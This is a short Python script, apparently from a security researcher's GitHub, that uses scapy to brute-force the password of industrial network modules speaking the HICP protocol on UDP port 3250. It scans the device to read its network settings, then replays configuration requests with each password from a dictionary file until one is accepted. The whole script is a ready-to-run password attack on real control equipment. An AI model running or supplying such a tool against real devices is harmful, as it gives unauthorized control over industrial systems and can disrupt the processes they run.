# Lex @ https://github.com/claire-lex
# Script for HICP password bruteforce

from sys import argv
from time import sleep
from getpass import getpass
from socket import gaierror
from scapy.compat import raw
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.sendrecv import send, sniff
from hicp import HICPModuleScan, HICPConfigure

if len(argv) != 3:
    print("Usage: {0} ip_address dictionary".format(argv[0]))
    exit(-1)

# Prepare
target = IP(dst=argv[1])/UDP(dport=3250, sport=3250)

# Retrieve required information to build a configuration request
try:
    send(target/HICPModuleScan(), verbose=False)
except gaierror:
    print("IP address is invalid ({0}).".format(argv[1]))
    exit(-1)
resp = sniff(filter="port 3250", count=1)[0]
if resp.hicp_command != b"Module scan response":
    print("The response is not the one we expected, please try again.")
    exit(-1)

# Prepare the configuration request
# Keep the same values so that we test passwords without changing anything.
conf = HICPConfigure(
    target=resp.mac_address,
    ip_address=resp.ip_address,
    subnet_mask=resp.subnet_mask,
    gateway_address=resp.gateway_address,
    dhcp=resp.dhcp,
    hostname=resp.hostname,
    dns1=resp.dns1,
    dns2=resp.dns2
)

# Let's first check that there is actually a password
send(target/conf, verbose=False)
resp = sniff(filter="port 3250", count=1)[0]
if resp.hicp_command != b"Invalid Password":
    print("The device does not seem to be password-protected.")
    exit(0)

# Now we read the dictionary file and send one request per line.
with open(argv[2], 'r') as fd:
    for line in fd:
        sleep(0.2) # Need time to process requests
        conf.password = line.strip()
        print("\rTesting: ", line.strip(), " " * 10, end="")
        send(target/conf, verbose=False)
        resp = sniff(filter="port 3250", count=1)[0]
        if resp.hicp_command == b"Reconfigured":
            print("\nThe password is: ", line.strip())
            exit(0)
print("\nThe password was not found.")
